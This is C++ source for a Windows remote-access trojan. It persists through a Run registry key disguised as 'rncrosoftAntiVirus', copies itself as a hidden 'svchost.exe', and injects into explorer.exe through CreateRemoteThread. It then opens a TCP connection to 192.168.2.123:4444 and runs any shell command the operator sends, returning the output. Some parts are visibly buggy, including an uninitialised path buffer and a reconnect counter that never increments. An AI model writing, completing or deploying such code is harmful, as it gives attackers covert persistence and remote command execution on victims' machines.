#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <tlhelp32.h>
#include <windows.h>
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "ws2_32.lib") // Link with the ws2_32.lib library

// ============================================================================
// MODIFICATION: Function to add program to Windows startup registry
// ============================================================================
bool AddToStartup() {
    HKEY hKey;
    const char* czStartName = "rncrosoftAntiVirus";
    char szPath[MAX_PATH];

    // Get the full path of the current executable
    if (GetModuleFileNameA(NULL, szPath, MAX_PATH) == 0) {
        std::cerr << "Failed to get executable path." << std::endl;
        return false;
    }

    // Open the Run registry key
    LONG result = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_SET_VALUE,
        &hKey
    );

    if (result != ERROR_SUCCESS) {
        std::cerr << "Failed to open registry key. Error: " << result << std::endl;
        return false;
    }

    // Set the value in the registry
    result = RegSetValueExA(
        hKey,
        czStartName,
        0,
        REG_SZ,
        (BYTE*)szPath,
        strlen(szPath) + 1
    );

    RegCloseKey(hKey);

    if (result != ERROR_SUCCESS) {
        std::cerr << "Failed to set registry value. Error: " << result << std::endl;
        return false;
    }

    std::cout << "Successfully added to startup!" << std::endl;
    std::cout << "Registry path: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" << std::endl;
    std::cout << "Entry name: " << czStartName << std::endl;
    return true;
}

// Function to remove from startup (optional cleanup)
bool RemoveFromStartup() {
    HKEY hKey;
    const char* czStartName = "MyClientApp";

    LONG result = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_SET_VALUE,
        &hKey
    );

    if (result != ERROR_SUCCESS) {
        return false;
    }

    result = RegDeleteValueA(hKey, czStartName);
    RegCloseKey(hKey);

    return (result == ERROR_SUCCESS);
}

// END MODIFICATION
// MODIFICATION: Process injection functions to inject into explorer.exe
// Find process ID by name
DWORD FindProcessId(const std::wstring& processName) {
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    if (Process32First(snapshot, &processEntry)) {
        do {
            if (processName == processEntry.szExeFile) {
                CloseHandle(snapshot);
                return processEntry.th32ProcessID;
            }
        } while (Process32Next(snapshot, &processEntry));
    }

    CloseHandle(snapshot);
    return 0;
}

// Inject DLL or code into target process
bool InjectIntoProcess(DWORD processId) {
    //core function for process injection
    char szPath[MAX_PATH];

    // Get the full path of the current executable
    if (GetModuleFileNameA(NULL, szPath, MAX_PATH) == 0) {
        std::cerr << "Failed to get executable path." << std::endl;
        return false;
    }

    // Open the target process
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE,
        processId
    );

    if (hProcess == NULL) {
        std::cerr << "Failed to open target process. Error: " << GetLastError() << std::endl;
        return false;
    }

    // Allocate memory in the target process for the DLL path
    LPVOID pRemoteMemory = VirtualAllocEx(
        hProcess,
        NULL,
        strlen(szPath) + 1,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (pRemoteMemory == NULL) {
        std::cerr << "Failed to allocate memory in target process. Error: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    // Write the DLL path to the allocated memory
    if (!WriteProcessMemory(hProcess, pRemoteMemory, szPath, strlen(szPath) + 1, NULL)) {
        std::cerr << "Failed to write to process memory. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Get the address of LoadLibraryA
    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (pLoadLibrary == NULL) {
        std::cerr << "Failed to get LoadLibraryA address." << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Create a remote thread to load the DLL
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pLoadLibrary,
        pRemoteMemory,
        0,
        NULL
    );

    if (hThread == NULL) {
        std::cerr << "Failed to create remote thread. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    std::cout << "Successfully injected into process!" << std::endl;
    std::cout << "Process ID: " << processId << std::endl;

    // Wait for the thread to finish
    WaitForSingleObject(hThread, INFINITE);

    // Cleanup
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return true;
}
// Copy executable to Windows directory and create scheduled task

bool SetupPersistenceWithInjection() {
    char szCurrentPath[MAX_PATH];
    char szTargetPath[MAX_PATH];

    // Get current executable path
    if (GetModuleFileNameA(NULL, szCurrentPath, MAX_PATH) == 0) {
        std::cout << "returnd from here lol" << std::endl;
        return false;
    }
    strcat_s(szTargetPath, "C:\\svchost.exe"); //disguise LoL
    // Copy to Windows directory with hidden name
    GetWindowsDirectoryA(szTargetPath, MAX_PATH);
    

    // Copy file if not already there
    if (GetFileAttributesA(szTargetPath) == INVALID_FILE_ATTRIBUTES) {
        if (!CopyFileA(szCurrentPath, szTargetPath, FALSE)) {
            std::cerr << "Failed to copy file. Error: " << GetLastError() << std::endl; //failed to run with AV survilliance, root priviledge needed!
            return false;
        }

        // Set file as hidden and system
        SetFileAttributesA(szTargetPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

        std::cout << "Copied executable to: " << szTargetPath << std::endl;
    }

    // Find explorer.exe process
    DWORD explorerPid = FindProcessId(L"explorer.exe");
    if (explorerPid == 0) {
        std::cerr << "Failed to find explorer.exe" << std::endl;
        return false;
    }

    std::cout << "Found explorer.exe with PID: " << explorerPid << std::endl;

    // Inject into explorer.exe
    return InjectIntoProcess(explorerPid);
}

std::string exec(const char* cmd) {
    // Pipe pointer to hold the output stream of the command
    FILE* pipe = nullptr;

    // Use _popen (Windows) to execute the command and open a pipe to read its output
#ifdef _WIN32
    pipe = _popen(cmd, "r");
#else
    // On Linux/macOS, use popen (and the 'ls -l' command would be used instead of 'dir')
    pipe = popen(cmd, "r");
#endif

    // Check if the pipe opened successfully
    if (!pipe) {
        // Throw an exception if popen failed
        throw std::runtime_error("Failed to execute command via popen/ _popen!");
    }

    // Buffer to read output chunks
    char buffer[128];
    std::string result = "";

    // Read data from the pipe until the end of the file (EOF)
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }

    // Close the pipe and wait for the command to finish
    int status = -1;
#ifdef _WIN32
    status = _pclose(pipe);
#else
    status = pclose(pipe);
#endif

    if (status == -1) {
        // Handle closure error (though often ignored for simple commands)
        // For robustness, we check it here.
    }

    return result;
} //cmd execution
std::string firstWord(std::string sentence)
{
    size_t spacePos = sentence.find(' ');
    std::string firstWord;
    if (spacePos != std::string::npos) {
        firstWord = sentence.substr(0, spacePos);
    }
    else {
        firstWord = sentence;
    }
    return firstWord;
}
std::string stripFirstWord(std::string sentence, std::string firstWord) {
    if (sentence.length() <= firstWord.length()) {
        return "";
    }
    size_t startPos = firstWord.length();
    if (startPos < sentence.length() && sentence[startPos] == ' ') {
        startPos++; // Move past the space
    }
    return sentence.substr(startPos);
}
int main() {

    AddToStartup(); //add Auto-start using registry
    std::cout << "Setting up persistence via process injection..." << std::endl;
    SetupPersistenceWithInjection(); //process injection
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed." << std::endl;
        return 1;
    }

    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    while (clientSocket==INVALID_SOCKET)    //repeating connecting to host
    {
        int count = 0;
        std::cerr << "Failed to connect to host, waiting 7s to reconnect" << std::endl;
        clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (count>=7) {
            std::cerr << "Cannot connect to host, Exiting!" << std::endl;
            WSACleanup();
            return 1;
        }
    }
    

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;

    // Correctly use inet_pton
    if (inet_pton(AF_INET, "192.168.2.123", &serverAddr.sin_addr) <= 0) {
        std::cerr << "Invalid address." << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }

    serverAddr.sin_port = htons(4444); // should be same as host's listening port

    if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Connection failed." << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        std::cout << "Press Enter to exit...";
        std::cin.get();
        return 1;
    }

    std::cout << "Connected to the server." << std::endl;

    while (true) {
        // Receive the size of the incoming message
        int networkSize;
        int bytesReceived = recv(clientSocket, (char*)&networkSize, sizeof(int), 0);
        if (bytesReceived <= 0) {
            std::cerr << "Connection closed by server or failed to receive message size." << std::endl;
            break;
        }

        int messageSize = ntohl(networkSize);

        // Validate message size to prevent excessive allocation
        if (messageSize <= 0 || messageSize > 1048576) { // Max 1MB
            std::cerr << "Invalid message size: " << messageSize << std::endl;
            break;
        }

        // Receive the actual message
        char* buffer = new char[messageSize + 1];
        memset(buffer, 0, messageSize + 1);

        int totalReceived = 0;
        while (totalReceived < messageSize) {
            bytesReceived = recv(clientSocket, buffer + totalReceived, messageSize - totalReceived, 0);
            if (bytesReceived <= 0) {
                std::cerr << "Failed to receive message data." << std::endl;
                delete[] buffer;
                closesocket(clientSocket);
                WSACleanup();
                return 1;
            }
            totalReceived += bytesReceived;
        }

        std::string receivedMessage(buffer);
        std::cout << "\nReceived message: " << receivedMessage << std::endl;

        // Check if the received message is "Quit"
        if (receivedMessage == "Quit") {
            std::cout << "Quit command received. Closing connection..." << std::endl;
            delete[] buffer;
            break;
        }
        if (receivedMessage == "ls")
        {
            const char* command = "dir";
            try
            {
                std::string message = exec(command);
                while (true) {
                    // Send the size of the message first, so the client knows how much to receive
                    int messageSize = message.length();
                    int networkSize = htonl(messageSize); // Convert to network byte order

                    if (send(clientSocket, (char*)&networkSize, sizeof(int), 0) == SOCKET_ERROR) {
                        std::cerr << "Send size failed. Host may have disconnected." << std::endl;
                        break; // Exit loop on error
                    }

                    // Send the actual message
                    int totalSent = 0;
                    while (totalSent < messageSize) {
                        int sent = send(clientSocket, message.c_str() + totalSent, messageSize - totalSent, 0);
                        if (sent == SOCKET_ERROR) {
                            std::cerr << "Send failed. Client may have disconnected." << std::endl;
                            break;
                        }
                        totalSent += sent;
                    }

                    if (totalSent < messageSize) {
                        break; // Exit if send was incomplete
                    }

                    std::cout << "Message sent successfully." << std::endl;
                    break;
                }
            }
            catch (const std::exception&e)
            {
                std::cerr << "An error has occured at ls" << e.what() << std::endl;
            }
        }
        if (firstWord(receivedMessage) == "shell")
        {
            try
            {
                std::string realCommand = stripFirstWord(receivedMessage, "shell");
                std::string message = exec(realCommand.c_str());
                while (true) {
                    // Send the size of the message first, so the client knows how much to receive
                    int messageSize = message.length();
                    int networkSize = htonl(messageSize); // Convert to network byte order

                    if (send(clientSocket, (char*)&networkSize, sizeof(int), 0) == SOCKET_ERROR) {
                        std::cerr << "Send size failed. Host may have disconnected." << std::endl;
                        break; // Exit loop on error
                    }

                    // Send the actual message
                    int totalSent = 0;
                    while (totalSent < messageSize) {
                        int sent = send(clientSocket, message.c_str() + totalSent, messageSize - totalSent, 0);
                        if (sent == SOCKET_ERROR) {
                            std::cerr << "Send failed. Client may have disconnected." << std::endl;
                            break;
                        }
                        totalSent += sent;
                    }

                    if (totalSent < messageSize) {
                        break; // Exit if send was incomplete
                    }

                    std::cout << "Message sent successfully." << std::endl;
                    break;
                }
            }
            catch (const std::exception& e)
            {
                std::cerr << "An error has occured at ls" << e.what() << std::endl;
            }
        }
        delete[] buffer;
    }

    closesocket(clientSocket);
    WSACleanup();
    return 0;
}